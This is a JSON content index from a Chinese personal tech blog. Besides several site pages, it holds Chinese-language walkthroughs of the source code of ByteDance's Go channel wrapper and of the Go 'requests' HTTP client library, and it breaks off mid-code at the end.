{"meta":{"title":"Hygao Blog","subtitle":null,"description":null,"author":"Hygao","url":"","root":"/"},"pages":[{"title":"404 Not Found","date":"2023-12-30T18:04:50.525Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"404.html","permalink":"/404.html","excerpt":"","text":"404 Not Found **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2023-12-30T18:04:50.529Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"index.html","permalink":"/index.html","excerpt":"","text":""},{"title":"关于","date":"2023-12-30T18:04:50.529Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"这个 正在读书&amp;&amp;热爱技术&amp;&amp;喜欢电影&amp;&amp;喜欢音乐 的人很懒，什么都没有留下"},{"title":"所有分类","date":"2023-12-30T18:04:50.529Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2023-12-30T18:04:50.529Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"杂项","date":"2023-12-30T18:04:50.529Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"tools/index.html","permalink":"/tools/index.html","excerpt":"","text":"这是一个随心所欲的地方，不定期投放各种奇怪的东西 把三元表达式转换成if-else语句的小玩意 图灵机Demo版"},{"title":"我的友链","date":"2023-12-30T18:04:50.529Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"friends/index.html","permalink":"/friends/index.html","excerpt":"","text":""},{"title":"三元表达式转if-else语句","date":"2023-12-30T18:04:50.529Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"tools/converter.html","permalink":"/tools/converter.html","excerpt":"","text":".tex { width: 100%; height:200px; overflow: 100%; border-radius: 5px; } .btn { text-align: center; width: 100%; height: 30px; font-size: 100%; background-color: rgb(100,200,255); color: rgb(255,255,255); border-radius: 5px; } 转换时的分隔符为 ? 与 : 两个符号，请确保两者不会出现在诸如字符串一类的特殊地方 转换时以小括号作为分组依据，故无法处理一对括号外侧带有无关字符的情况 若在使用中遇到什么问题或您有什么好的建议，欢迎和我交流 Translate tex = document.querySelector('#tex'); btn = document.querySelector('.btn'); rlt = document.querySelector('#rlt'); btn.onclick = ()=>{ rlt.focus(); let tmp = tex.value.split(' ').join(''); rlt.value = ''; function getSplitContent(tmp) { let balance = 0; let indexs = []; let words = []; for (let i=0; i"}],"posts":[{"title":"bytedance channel wrapper 源码解读","slug":"golang-bytedance-channel","date":"2023-12-30T11:59:57.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/12/30/golang-bytedance-channel/","link":"","permalink":"/2023/12/30/golang-bytedance-channel/","excerpt":"","text":"前言现代应用中，多线程或更轻量的多协程编程是必不可少的。不论是线程还是协程，都是一个个可以被调度的执行单元，为了让这些执行单元能够协同起来一起完成任务，就需要跨单元来传递一些数据，而这不可避免地会带来数据竞争的问题。为了解决数据竞争，大多数的编程语言采用了加锁的方式来让一部分代码在同一时间只能被一个执行单元访问到，由此来构成安全区；golang 在语言层面则采用了不一样的方法（标准库也提供了协程级别加锁的能力），它的哲学是“不要通过共享内存来通信，而应该通过通信来共享内存”，而它提供的通信方案正是 channel。 之前我写过一篇博客来解读 golang 原生 channel 的源码，我个人认为它的设计是非常优雅的。不过虽然从使用方式上它足够简单易用，但事实上它并不是一个生产友好的组件，如果使用不当很有可能造成应用的安全隐患。 原生 channel 的一些问题Golang 中的 channel 通过内置的 make 关键字来初始化，在初始化时除了可以提供需要传递的元素类型，还可以提供一个非必需的容量。这个容量会将 channel 区分成阻塞式和非阻塞式的，前者当且仅当有协程在从 channel 中读取数据时，尝试写入的协程才不会阻塞；后者则提供一个 buffer，在 buffer 还没有被充满时，尝试向 channel 写入内容的协程不会阻塞（这是站在写入方的角度，反过来站在读取方的角度也是一样的）。阻塞的 channel 通常被用于实现一次性通知，比如 context 的取消、优雅退出等功能，这些场景都比较简单，使用中也不会有什么大问题。 而与阻塞 channel 不同，非阻塞的 channel 通常被实现生产-消费模型，这与具体的业务场景息息相关且灵活多变，稍不注意就可能产生问题。我们来想象一个场景，假设我们有一个服务，对外提供一个接口 SubmitTask 用于提交一个可以稍后被执行的任务。那么 channel 就可以作为一个技术选型，比如每次请求来的时候向 channel 中写入一个任务的上下文就返回，然后应用中有一个后台的协程从 channel 中消费任务并做具体的处理。 这里这个后台协程处理 channel 中元素的方式就可以分为同步和异步两种。所谓同步指的是后台协程自己完全接管从 channel 中取任务和执行任务的工作，而与之相对的，异步指的是每次收到一个或几个任务后就起一个新的协程来处理，这样做的好处在于负责消费 channel 的协程就不会因为忙于处理任务而一段时间无法消费 channel 中的元素，导致写入方在写入时阻塞。异步处理的隐患在于，消费时启动的新协程的数量取决于 channel 中 buffer 的长度和写入方的写入速度，而这两点其实都不靠谱，比如写入速度是完全取决于业务场景的，在我们的例子中有可能因为峰值流量导致写入速度瞬间增加，而 buffer 的长度又是一个经验性的取值，且 channel 一旦创建就不可修改，那么如果取大了就会让任务协程的数量完全取决于写入流量，取小了又会退回成阻塞式 channel，写入方就会受到影响。 由此可见，原生 channel 会有这个问题的重要原因在于，控制写入和读取流量的方式对于一个 channel 而言是静态的，而在实际环境中通常是需要动态调整的。虽然我们也可以通过 select+default 的方式来避免完全阻塞或让写入方丢弃一些消息来降低读取方的消费压力，但这些细节其实也比较容易出错且有必要为了复用而直接封装到组件里，后面我们会看到本次阅读的 channel wrapper 就具备这样的能力。 另一方面，上面的描述也引出了原生 channel 的另一个问题，就是不支持丢弃元素。这看起来是一件好事，但实际上在消费不及时的情况下，丢弃一些元素来让更多的元素能够被处理是非常重要的手段。还是回到上面 SubmitTask 的例子里，假设我们的任务是有时效性的，在消费不及时的情况下可能取到的任务已经没必要处理了，此时直接丢弃掉已经无效的元素，快速将消费进度拉齐到此时需要被处理的元素才是正确的做法。 最后，原生 channel 的关闭不是幂等的，重复关闭同一个 channel 得到的不是报错，而是直接崩溃退出；与之类似的，向一个已经关闭的 channel 写入内容也不会得到报错，同样也是崩溃退出。而这两点都是很容易被写出的代码，却不容易被测试覆盖到，因为这是运行时错误。 源码解读 源码文件：https://github.com/bytedance/gopkg/blob/a5eedbe/lang/channel/channel.go 基本结构golang 目前还没有提供语法层面的元编程能力（类似 Vue 那种用语言支持的语法实现更多功能的能力），所以如果要增强 channel 的能力，我们只能在原生 channel 上包装一个结构体并增加一些方法，而不能直接修改 &lt;- 或 -&gt; 操作符的行为。channel wrapper （后面简称 cw）提供了如下的接口： 12345678910111213// Channel is a safe and feature-rich alternative for Go chan structtype Channel interface &#123; // Input send value to Output channel. If channel is closed, do nothing and will not panic. Input(v interface&#123;&#125;) // Output return a read-only native chan for consumer. Output() &lt;-chan interface&#123;&#125; // Len return the count of un-consumed items. Len() int // Stats return the produced and consumed count. Stats() (produced uint64, consumed uint64) // Close closed the output chan. If channel is not closed explicitly, it will be closed when it's finalized. Close()&#125; 这里的方法除了 Stats 外都是原生 channel 也能提供的，但是以语法层面及编译器支持的方式来提供的，所以如果要将原生 channel 迁移到这里的 channel wrapper 还是有一些改造成本的。 回到源码本身，cw 提供了一个默认的接口实现： 12345678910111213141516171819// channel implements a safe and feature-rich channel struct for the real world.type channel struct &#123; size int // channel 的大小，如果 nonblock 为 true 那么这个字段无意义 state int32 // 标识 channel 是否已经关闭 consumer chan interface&#123;&#125; // 从这里读取元素 nonblock bool // 是否启用非阻塞模式，非阻塞模式下 buffer 的大小取决于内存 timeout time.Duration // 内部元素的最大生存时间，超过时会被吊起 timeoutCallback func(interface&#123;&#125;) // 如果超时会被调用的方法 producerThrottle Throttle // Input 时的 throttle，是一个函数，所以可以做到动态调整 consumerThrottle Throttle // Output 时的 throttle，和 Input 相同 throttleWindow time.Duration // 如果上面的两个 throttle 命中，那么隔多久再去调用一次 // statistics produced uint64 // item already been insert into buffer consumed uint64 // item already been sent into Output chan // buffer buffer *list.List // 用这个结构来记录写入后尚未被处理的元素 bufferCond *sync.Cond bufferLock sync.Mutex&#125; 创建/关闭虽然上面的 channel 结构实现了 Channel 接口，但最后被使用的并不是这个结构，而是另一个名为 channelWrapper 的结构： 1234// channelWrapper use to detect user never hold the reference of Channel object, and runtime will help to close channel implicitly.type channelWrapper struct &#123; Channel&#125; 为什么要包装这样一个结构呢？首先使用 Channel 接口可以在后面升级时不修改业务代码就将其替换成另一个具体的实现，而 channelWrapper 在此基础上再次包装了 Channel 接口，是为了能实现自动关闭 channel 的功能。具体来说，cw 可以由用户主动来关闭 channel，也可以在创建出来的 channel 不被引用时自动被关闭。和原生 channel 不同，cw 的关闭并不是可选的，因为它在初始化时会启动一个后台的协程来消费 channel 中的元素，那么当 cw 整体不可用时这个被启动的协程也应当被随之销毁；另一方面，和原生 channel 相同，关闭 cw 会通知尝试从中读取内容的协程。 下面来看创建和关闭的代码： 123456789101112131415161718192021222324252627282930313233343536373839// New 用于创建一个 channel wrapper，对外返回的是 Channel 接口，方便后面替换其他实现func New(opts ...Option) Channel &#123; // 创建一个 channel 结构体，并初始化内部结构 c := new(channel) c.size = defaultMinSize c.throttleWindow = defaultThrottleWindow c.bufferCond = sync.NewCond(&amp;c.bufferLock) for _, opt := range opts &#123; opt(c) &#125; c.consumer = make(chan interface&#123;&#125;) c.buffer = list.New() // 启动后台的消费协程 go c.consume() // 创建一个 channelWrapper 来包装上面的 channel cw := &amp;channelWrapper&#123;c&#125; // 为这个 cw 注册一个 Finalizer，因为 Channel 是一个接口，本质上是一个指针， // 所以 cw 是一个包含指针的结构体，那么 SetFinalizer 就不会被编译器优化掉 runtime.SetFinalizer(cw, func(obj *channelWrapper) &#123; // 对应的 Finalizer 函数就是调用上面创建的 channel 的 Close 方法， // 后面会看到，Close 是幂等的，所以即便用户此前已经关闭过，这里的关闭也不会导致崩溃 obj.Close() &#125;) return cw&#125;// Close 用于优雅关闭一个 channel wrapperfunc (c *channel) Close() &#123; // 如果当前的 cw 已经关闭，那么直接退出即可，这里来保证 Close 方法是幂等的 if !atomic.CompareAndSwapInt32(&amp;c.state, 0, -1) &#123; return &#125; // stop consumer c.bufferLock.Lock() c.buffer.Init() // 清空 buffer 对应的内存，并将长度置零，消费者协程会因此而判断当前是否应该完全停止消费 c.bufferLock.Unlock() c.bufferCond.Broadcast() // 通知所以等待在 bufferCond 的协程，其中就包含消费者协程&#125; 读取虽然 cw 对外提供了 Output 方法，但实际上它的实现非常简单： 123func (c *channel) Output() &lt;-chan interface&#123;&#125; &#123; return c.consumer&#125; 从上面的结构体描述中我们可以看到，这个字段是一个原生 channel，但它的内容并不直接来源于 Input 的输入，而是经过 cw 处理后的结果，具体来说，是被 New 方法创建的后台消费协程来处理的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344func (c *channel) consume() &#123; // 只要 cw 不关闭，处理就不停止 for &#123; // 是否应该被限流，后面我们会看到，这个 throttling 返回 true 代表当前 cw 已经被关闭了， // 这里直接退出即可 if c.throttling(c.consumerThrottle) &#123; return &#125; c.bufferLock.Lock() // 这里的长度为零可能是因为被调用了 Close，因为 c.buffer.Init() 会清零长度， // 也可能因为当前还没有任何协程向其中写入了内容 for c.buffer.Len() == 0 &#123; if c.isClosed() &#123; // 如果 cw 被关闭了 close(c.consumer) // 那关闭 consumer channel，此时所有的 Output 都会直接返回，对齐原生 channel 的行为 atomic.StoreInt32(&amp;c.state, -2) // -2 means closed totally c.bufferLock.Unlock() return // 退出当前的后台协程 &#125; c.bufferCond.Wait() // 等待信号量，如果有协程写入这里会被 Signal 唤醒 &#125; // 能执行到这里说明一定会取到一个元素 it, ok := c.dequeueBuffer() c.bufferLock.Unlock() c.bufferCond.Broadcast() // 通知负责写入的协程，当前 buffer 有空位，可以继续写入，这里只对 nonblock 为 false 的 cw 有效 if !ok &#123; // in fact, this case will never happen continue &#125; // 如果拿出的元素已经过期了，那么跳过这个元素继续消费下一个 if it.IsExpired() &#123; if c.timeoutCallback != nil &#123; c.timeoutCallback(it.value) &#125; atomic.AddUint64(&amp;c.consumed, 1) continue &#125; // 向 consumer channel 中写入刚刚消费到的内容，此时上面的 Output 会返回这个内容 c.consumer &lt;- it.value atomic.AddUint64(&amp;c.consumed, 1) &#125;&#125; 写入从上面读取部分的代码可以看到，尽管 cw 提供了 nonblock 模式，但消费部分完全没有区分是否是 nonblock。这也比较合理，因为根据消费协程的实现，只要 buffer 中有数据就不会阻塞在“取数”的环节，而如果 buffer 中没数据，本身就是应该阻塞在这个环节的。 但写入不同，nonblock 模式代表写入不会受限于 buffer 的大小，而应该取决于应用内存的大小。为了实现这一点，就要求 buffer 本身的大小取决于应用内存，在这之外根据是否为 nonblock 模式做一些限制。也就是说，我们需要 buffer 是一个可以动态调整大小的列表，那链表就是一个很好的选择： 123456789101112131415161718192021222324252627282930313233343536func (c *channel) Input(v interface&#123;&#125;) &#123; // 如果 cw 已经被关闭了，这里就直接返回，而不是崩溃退出 if c.isClosed() &#123; return &#125; // 将输入包装在 item 结构中，item 用于判断元素是否已经过期 it := item&#123;value: v&#125; if c.timeout &gt; 0 &#123; // 如果 cw 在初始化时声明了元素的最大生存时间，就在 item 中记录元素的过期时间 it.deadline = time.Now().Add(c.timeout) &#125; // 仅非 nonblock 模式时才判断是否命中限流 if !c.nonblock &#123; if c.throttling(c.producerThrottle) &#123; // closed return &#125; &#125; // enqueue buffer c.bufferLock.Lock() if !c.nonblock &#123; // 阻塞模式下如果当前 buffer 的长度已经超过了初始化时声明的最大长度，就将当前协程挂起 for c.buffer.Len() &gt;= c.size &#123; c.bufferCond.Wait() &#125; &#125; // 否则向 buffer 中写入内容，事实上执行到这里时有可能当前的 cw 已经关闭了， // 但 enqueueBuffer 并没有做进一步的判断，所以需要保证尽管 cw 被关闭，buffer 仍然是一个可用的结构， // 最终 buffer 靠 GC 来做清除 c.enqueueBuffer(it) atomic.AddUint64(&amp;c.produced, 1) c.bufferLock.Unlock() c.bufferCond.Signal() // 通知其他协程当前 buffer 有变动，消费协程会因此开始消费 buffer&#125; 限流从上面的写入和读取相关代码可以看到，cw 在做具体的处理前都先判断当前是否命中了限流。这个限流是配合初始化时声明的 producerThrottle 和 consumerThrottle 来分别判断的，由于这俩都是函数，所以可以实现各种动态的限流方案，这里不对每种方案做解读，只给出注册限流函数和判断是否该限流的源码解读： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// WithThrottle 用于注册限流函数func WithThrottle(producerThrottle, consumerThrottle Throttle) Option &#123; return func(c *channel) &#123; // 如果此前没有设置过 producerThrottle，那么直接赋值 if c.producerThrottle == nil &#123; c.producerThrottle = producerThrottle &#125; else &#123; // 否则新的 producerThrottle 等于旧的 producerThrottle 且入参的 producerThrottle prevChecker := c.producerThrottle c.producerThrottle = func(c Channel) bool &#123; return prevChecker(c) &amp;&amp; producerThrottle(c) &#125; &#125; // consumerThrottle 的处理逻辑相同 if c.consumerThrottle == nil &#123; c.consumerThrottle = consumerThrottle &#125; else &#123; prevChecker := c.consumerThrottle c.consumerThrottle = func(c Channel) bool &#123; return prevChecker(c) &amp;&amp; consumerThrottle(c) &#125; &#125; &#125;&#125;// throttling 用于根据传递的 Throttle 做实际的限流操作func (c *channel) throttling(throttle Throttle) (closed bool) &#123; if throttle == nil &#123; // 如果传递了 nil（初始化时没设置 Throttle 函数），这里直接返回 return &#125; throttled := throttle(c) if !throttled &#123; // 如果设置了 Throttle 但判断为不需要限流，这里直接返回 return &#125; // 创建一个 ticker，每隔 throttleWindow 再调一次 Throttle 判断是否仍被限流 ticker := time.NewTicker(c.throttleWindow) defer ticker.Stop() // 只要当前 cw 没有被关闭且仍处于被限流状态，就继续循环下去 closed = c.isClosed() for throttled &amp;&amp; !closed &#123; &lt;-ticker.C throttled, closed = throttle(c), c.isClosed() &#125; return closed&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"golang requests 源码解读","slug":"golang-requests","date":"2023-10-08T15:06:28.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/10/08/golang-requests/","link":"","permalink":"/2023/10/08/golang-requests/","excerpt":"","text":"1. 前言最近在公司做项目时要调用平台提供的大量 openAPI，尽管 golang 的 http 标准库能够满足需求，但为了实现功能需要写很长的代码，读起来也不是很舒服，所以就想在 github 上找找标准库的封装。想起很久前学 python 时学过的 requests 库，抱着试一试的心态搜索了一下，结果居然真的有 golang 版本的同名库。对着 readme 学了下，发现使用方式还真的蛮 gopher 的，作者还写了一篇博客描述了自己的一些设计取舍，也非常有意思。 下面是一个发送 GET 请求时，使用标准库与 requests 对比的例子： 标准库 requests 123456789101112131415req, err := http.NewRequestWithContext(ctx, http.MethodGet, \"http://example.com\", nil)if err != nil &#123; // ...&#125;res, err := http.DefaultClient.Do(req)if err != nil &#123; // ...&#125;defer res.Body.Close()b, err := io.ReadAll(res.Body)if err != nil &#123; // ...&#125;s := string(b) 12345var s stringerr := requests. URL(\"http://example.com\"). ToString(&amp;s). Fetch(ctx) 需要 15+ 行需要 5 行 可以看到对比起来，requests 版本的代码还是非常简单清晰的。 2. 源码解读2.1. fetch 主流程从上面的代码中可以看到，requests 发起请求时可以用链式调用的方式声明请求中的内容以及如何处理响应，这个链式调用以 requests.URL 开始，经过一系列的配置后，在 Fetch 调用处发起 http 请求。requests.URL 方法的定义非常简单，它构建了一个 Builder 的结构体，并将其 baseurl 字段设置为 requests.URL 方法的入参，而这个结构体的完整定义如下： 123456789101112type Builder struct &#123; baseurl string // 请求的基础链接，这里可以只写一部分，也可以直接写完整的链接 scheme, host string // 如果有值则会覆盖 .baseurl 解析出的内容，比如 baseurl 是 http 请求，这里可以将 scheme 设置成 https paths []string // 请求链接中 baseurl 之后的部分，可以写多个，会用 path.Join 拼接起来 params []multimap // 请求的 query 参数 headers []multimap // 请求头中的各个字段，key 会经过 http.CanonicalHeaderKey 的包装 getBody BodyGetter // 定义如何构造请求中的 body，是一个函数 method string // 请求方法，默认是 GET cl *http.Client // 使用哪个 http.Client 发起请求，默认是 http.DefaultClient validators []ResponseHandler // 在 .handler 之前调用的一系列函数，通常用来校验一些内容 handler ResponseHandler // 定义如何处理响应体中的内容，是一个函数&#125; 事实上，后续的一系列链式调用都是调用的这个结构体的方法，不同的方法用于填充不同的字段，然后在 Fetch 中以这个结构体的各个字段来构建 http.Request 结构并发送出去，而 Fetch 内部其实仅仅是调用了 Request 和 Do 两个方法，前者用于构建 http.Request 结构，后者则用于发送请求并处理响应，这两个函数的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384func (rb *Builder) Request(ctx context.Context) (req *http.Request, err error) &#123; u, err := url.Parse(rb.baseurl) if err != nil &#123; return nil, fmt.Errorf(\"could not initialize with base URL %q: %w\", u, err) &#125; if u.Scheme == \"\" &#123; // 如果 baseurl 未提供 scheme，那么默认采用 https 协议 u.Scheme = \"https\" &#125; if rb.scheme != \"\" &#123; // Builder 的 scheme 字段优先级最高，可以通过 Scheme(string) 方法设置 u.Scheme = rb.scheme &#125; if rb.host != \"\" &#123; // Builder 的 host 字段优先级最高，可以通过 Host(string) 方法设置 u.Host = rb.host &#125; for _, p := range rb.paths &#123; // 可以通过 Path 或 Pathf 方法向 paths 中加入内容 if strings.HasPrefix(p, \"/\") &#123; // 如果某个 path 以 / 开头，那么重新计算完整的 path u.Path = p &#125; else if curpath := path.Clean(u.Path); curpath == \".\" || curpath == \"/\" &#123; u.Path = path.Clean(p) &#125; else &#123; // 否则与已有的 path 做 Join 操作 u.Path = path.Clean(path.Join(u.Path, p)) &#125; &#125; if len(rb.params) &gt; 0 &#123; // 如果提供了 query 参数，那么设置到 RawQuery 中 q := u.Query() // 这里先从 u.Query() 中查了一下，所以 baseurl 里也可以提供 query 参数，但 Builder 中的优先级更高 for _, kv := range rb.params &#123; q[kv.key] = kv.values &#125; u.RawQuery = q.Encode() &#125; var body io.ReadCloser if rb.getBody != nil &#123; // 如果 getBody 方法不为 nil，那么调用它来获取请求体，这里后面我们会重点提到 if body, err = rb.getBody(); err != nil &#123; return nil, err &#125; &#125; method := http.MethodGet // 默认使用 Get 方法，如果 getBody 方法不为 nil 说明有请求体，此时默认使用 Post 方法，而最终还是以 Builder 中的内容为准 if rb.getBody != nil &#123; method = http.MethodPost &#125; if rb.method != \"\" &#123; method = rb.method &#125; // 根据上面的内容构造出 http.Request 结构，在函数结束时返回它 req, err = http.NewRequestWithContext(ctx, method, u.String(), body) if err != nil &#123; return nil, err &#125; req.GetBody = rb.getBody // 这里将 getBody 赋值给了 req.GetBody，所以可能会重复调用，需要保证提供的 getBody 方法是幂等的 for _, kv := range rb.headers &#123; req.Header[http.CanonicalHeaderKey(kv.key)] = kv.values &#125; return req, nil&#125;func (rb *Builder) Do(req *http.Request) (err error) &#123; cl := http.DefaultClient // 默认使用 http.DefaultClient，如果 Builder 设置了 client，那么以 Builder 为准 if rb.cl != nil &#123; cl = rb.cl &#125; res, err := cl.Do(req) // 发起请求并获取响应 if err != nil &#123; return err &#125; defer res.Body.Close() // 在函数结束时关闭 Body，这里是使用 http 标准库时很容易忽略的点，requests 帮助做了这件事 validators := rb.validators // 在 handler 执行前先跑一遍全部 validators，如果没提供的话就只跑 DefaultValidator，在其中会校验状态码 if len(validators) == 0 &#123; validators = []ResponseHandler&#123;DefaultValidator&#125; &#125; if err = ChainHandlers(validators...)(res); err != nil &#123; return err &#125; h := consumeBody // 默认使用 consumeBody 作为响应体的 handler，这个方法只是用来消费 body 中的内容但不做任何处理，可以通过 Builder 提供其他的 handler 来处理响应体 if rb.handler != nil &#123; h = rb.handler &#125; if err = h(res); err != nil &#123; return err &#125; return nil&#125; 可以看到，在整个发送请求的过程中，Builder 上定义的 getBody、validators、handler 是非常关键的，它们描述了如何发送请求体与如何处理响应，而这正是一个复杂 http 请求中需要处理的事情。requests 提供了一些 helper 函数来处理一些常见的场景。 2.2. BodyGettergetBody 的类型是 BodyGetter，它的具体定义为 type BodyGetter = func() (io.ReadCloser, error)，预期最终会返回一个 io.ReadCloser，这个返回值在 Request 方法中会作为 http.NewRequestWithContext 的 body 参数。 所以为了传递一个具体的 body，我们可以自己实现一个 BodyGetter 函数，然后在构造请求时通过 Builder.Body 函数传递给 requests，但多数场景下我们可以直接使用 requests 封装好的一些 BodyGetter，这些方法在 Builder 结构上分别有对应的 shortcut，内部的实现很简单，都是用内置的 BodyGetter 作为参数调用 Builder.Body，并按需设置请求头中的内容： 12345678910111213141516171819202122232425262728293031323334// 直接赋值 getBody，不判断是否已经有值，所以重复调用时以最后一次调用为准func (rb *Builder) Body(src BodyGetter) *Builder &#123; rb.getBody = src return rb&#125;// 从 reader 中获取请求体func (rb *Builder) BodyReader(r io.Reader) *Builder &#123; return rb.Body(BodyReader(r))&#125;// 提供一个向 writer 中写入内容的函数，writer 由 requests 注入，写入的内容会收集到一个 reader 中，然后从这个 reader 中获取请求体func (rb *Builder) BodyWriter(f func(w io.Writer) error) *Builder &#123; return rb.Body(BodyWriter(f))&#125;// 从字节切片中获取请求体func (rb *Builder) BodyBytes(b []byte) *Builder &#123; return rb.Body(BodyBytes(b))&#125;// 将结构体序列化成 json 字符串作为请求体，并设置请求头中的 content-typefunc (rb *Builder) BodyJSON(v interface&#123;&#125;) *Builder &#123; return rb. Body(BodyJSON(v)). ContentType(\"application/json\")&#125;// 将 url.Values 整合成表单请求的请求体，并设置请求头中的 content-typefunc (rb *Builder) BodyForm(data url.Values) *Builder &#123; return rb. Body(BodyForm(data)). ContentType(\"application/x-www-form-urlencoded\")&#125; 由于 Builder.Body 并不会检查 Builder.getBody 是否已经有值，所以如果在一次链式调用中重复调用多个设置请求体的方法，那么最终会以最后一次为准。 从上面的代码可以看到，设置请求体的核心逻辑不在 Builder 的方法中，而是各个方法中传递给 Builder.Body 的函数，这些函数可以从入参获取 BodyGetter，具体来说有如下几个： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// BodyReader 直接将入参的 Reader 封装一下返回，因为 BodyGetter 的定义就是要一个 ReadCloserfunc BodyReader(r io.Reader) BodyGetter &#123; return func() (io.ReadCloser, error) &#123; // 如果本身就是 ReadCloser，那么直接返回 if rc, ok := r.(io.ReadCloser); ok &#123; return rc, nil &#125; // 否则套一层 NopCloser，这个方法返回一个 nopCloser 结构，拥有一个空的 Close 方法 return io.NopCloser(r), nil &#125;&#125;// BodyWriter 接收一个入参为 Writer 的函数，Writer 由 requests 注入，函数直接向 Writer 中写入内容，这些内容会被另一侧的 Reader 获取到func BodyWriter(f func(w io.Writer) error) BodyGetter &#123; return func() (io.ReadCloser, error) &#123; // Pipe 返回一个 Writer 和 Reader，向 Writer 中写入内容能在 Reader 中读到 r, w := io.Pipe() // 另起一个 goroutine，让 Writer 的写入和 Reader 的读取能同时进行 go func() &#123; var err error defer func() &#123; w.CloseWithError(err) &#125;() err = f(w) &#125;() // 将 Reader 返回出去，供 http 标准库消费 return r, nil &#125;&#125;// BodyBytes 将一个 []byte 结构包装成 ReadCloserfunc BodyBytes(b []byte) BodyGetter &#123; return func() (io.ReadCloser, error) &#123; return io.NopCloser(bytes.NewReader(b)), nil &#125;&#125;// BodyJSON 将某个结构 marshal 为 json 字节序列，然后用 NopCloser 包装后返回func BodyJSON(v interface&#123;&#125;) BodyGetter &#123; return func() (io.ReadCloser, error) &#123; b, err := json.Marshal(v) if err != nil &#123; return nil, err &#125; return io.NopCloser(bytes.NewReader(b)), nil &#125;&#125;// BodyForm 处理 application/x-www-form-urlencoded 类的请求体，包装后返回func BodyForm(data url.Values) BodyGetter &#123; return func() (r io.ReadCloser, err error) &#123; return io.NopCloser(strings.NewReader(data.Encode())), nil &#125;&#125; 2.3. ResponseHandler在 requests 中，validators 和处理请求的 handler 都是 ResponseHandler 类型，这个结构的类型定义为 type ResponseHandler = func(*http.Response) error，意图也非常明显，就是拿到一个 Response 的指针后对齐做一些处理，如果期间遇到错误就通过返回值抛出。通过这样的函数，requests 允许用户灵活地校验和处理响应体，来适配不同的业务场景。 先说 validators，顾名思义，它的作用是对某个 http 请求返回的内容做一些校验。我们可以通过 Builder.AddValidator 为某个请求加入所需的 validator，这个方法在 Builder.validators 列表中加入一个 ResponseHandler。我们在前面的 Builder.Do 方法中可以看到，在为某个响应执行 handler 之前会先跑一遍所有的 validator，当且仅当全部的 validator 都返回 nil 时才会进一步调用 handler。 而如果没有调用过 AddValidator，那么 validators 列表中就是空的，此时 requests 会默认执行 DefaultValidator，它的定义为： 1234567var DefaultValidator ResponseHandler = CheckStatus( http.StatusOK, http.StatusCreated, http.StatusAccepted, http.StatusNonAuthoritativeInfo, http.StatusNoContent,) 进一步来看 CheckStatus 这个函数，它的定义如下： 123456789101112func CheckStatus(acceptStatuses ...int) ResponseHandler &#123; return func(res *http.Response) error &#123; for _, code := range acceptStatuses &#123; if res.StatusCode == code &#123; return nil &#125; &#125; return fmt.Errorf(\"%w: unexpected status: %d\", (*ResponseError)(res), res.StatusCode) &#125;&#125; 具体来说，CheckStatus 接收一批 http 状态码作为白名单，当且仅当 Response 中的状态码在这个白名单中时才返回 nil，否则返回一个 error 让 Builder.Do 方法提前返回。除此之外，requests 中还提供 CheckContentType 和 CheckPeek 两种 helper 方法，前者检查响应头中的 content-type 是否在白名单中，后者接收一个函数用来检查响应体的前 n 个字节。 所有的 validators 都通过后，Builder.Do 会执行定义在 Builder 上的 handler 方法，我们可以通过调用 Builder.Handle 方法来设置。如果没有调用过，那么 requests 会默认执行 consumeBody 方法，这个方法的定义如下： 1234567func consumeBody(res *http.Response) (err error) &#123; const maxDiscardSize = 640 * 1 &lt;&lt; 10 // 最多读这么多字节，读完直接丢弃掉 if _, err = io.CopyN(io.Discard, res.Body, maxDiscardSize); err == io.EOF &#123; err = nil &#125; return err&#125; 除此之外，和 BodyGetter 一样，requests 为 handler 也提供了很多内置方法，这些方法在 Builder 上也有对应的 shortcut，具体如下： 12345678910111213141516171819// ToJSON 将响应体 unmarshal 到入参的 v 中func (rb *Builder) ToJSON(v interface&#123;&#125;) *Builder &#123; return rb.Handle(ToJSON(v))&#125;// ToString 将响应体的内容放到 sp 指向的字符串中func (rb *Builder) ToString(sp *string) *Builder &#123; return rb.Handle(ToString(sp))&#125;// ToBytesBuffer 将响应体的内容放到入参的 Buffer 中func (rb *Builder) ToBytesBuffer(buf *bytes.Buffer) *Builder &#123; return rb.Handle(ToBytesBuffer(buf))&#125;// ToWriter 将响应体内容 copy 到入参的 Writer 中，一个最常用的 Writer 就是 os.Stdoutfunc (rb *Builder) ToWriter(w io.Writer) *Builder &#123; return rb.Handle(ToWriter(w))&#125; 而这些 shortcut 内部的 ToXXX 的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243func ToJSON(v interface&#123;&#125;) ResponseHandler &#123; return func(res *http.Response) error &#123; // 读出所有的内容放到 data 中 data, err := io.ReadAll(res.Body) if err != nil &#123; return err &#125; // 将 data unmarshal 到 v 对应的结构中 if err = json.Unmarshal(data, v); err != nil &#123; return err &#125; return nil &#125;&#125;func ToString(sp *string) ResponseHandler &#123; return func(res *http.Response) error &#123; // 将 Body 直接 copy 到 strings.Builder 中 var buf strings.Builder _, err := io.Copy(&amp;buf, res.Body) if err == nil &#123; *sp = buf.String() &#125; // 将复制的内容通过 String 整合成 string 结构写入 sp 指向的内存中，所以 sp 不能为 nil return err &#125;&#125;func ToBytesBuffer(buf *bytes.Buffer) ResponseHandler &#123; return func(res *http.Response) error &#123; // 直接复制 _, err := io.Copy(buf, res.Body) return err &#125;&#125;func ToWriter(w io.Writer) ResponseHandler &#123; return 